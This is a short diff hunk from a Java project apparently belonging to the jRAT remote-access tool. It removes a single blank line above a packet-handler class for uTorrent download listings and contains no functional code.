@@ -6,7 +6,6 @@ import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.panels.PanelControluTorrentDownloads;
 
-
 public class Packet40UTorrentDownload extends AbstractIncomingPacket {
 
 	@Override
